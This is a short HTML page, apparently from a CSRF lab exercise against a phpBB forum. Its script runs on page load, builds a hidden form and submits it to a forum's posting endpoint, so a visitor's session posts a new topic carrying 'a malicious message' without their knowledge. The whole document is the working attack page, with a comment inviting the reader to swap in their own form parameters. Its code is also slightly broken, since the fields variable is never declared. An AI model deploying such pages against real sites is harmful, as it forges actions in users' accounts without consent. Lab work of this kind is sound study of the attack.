<html><body><h1>
This page sends a HTTP GET request onload.
</h1>
<script>
function post(url,fields)
{
   //create a <form> element.
   var p = document.createElement('form');
   //construct the form
   p.action = url;
   p.innerHTML = fields;
   p.target = '_self';
   p.method = 'get';
   //append the form to this web.
   document.body.appendChild(p);
   //submit the form
   p.submit();
}
function csrf_hack()
{

   // You should replace the following 3 lines with your form parameters
   fields += "<input type='hidden' name='subject' value='attack'>";
   fields += "<input type='hidden' name='message' value='a malicious message'>";
   fields += "<input type='hidden' name='mode' value='newtopic'>";
   fields += "<input type='hidden' name='f' value='1'>";
   fields += "<input type='hidden' name='post' value='Submit'>";

   post('http://www.csrflabphpbb.com/posting.php', fields);
}

window.onload = function(){csrf_hack();}

</script>
